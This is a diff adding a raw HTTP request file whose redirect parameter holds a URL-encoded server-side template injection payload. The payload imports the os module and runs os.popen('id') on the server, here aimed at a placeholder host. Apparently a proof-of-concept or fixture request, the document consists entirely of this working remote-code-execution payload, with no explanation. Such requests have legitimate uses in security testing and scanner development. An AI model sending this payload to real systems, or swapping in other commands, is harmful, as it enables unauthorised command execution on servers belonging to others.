@@ -1,0 +1,4 @@
+GET /a?redirect={%%0aimport%0aos%0a%}{{os.popen('id').read()}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
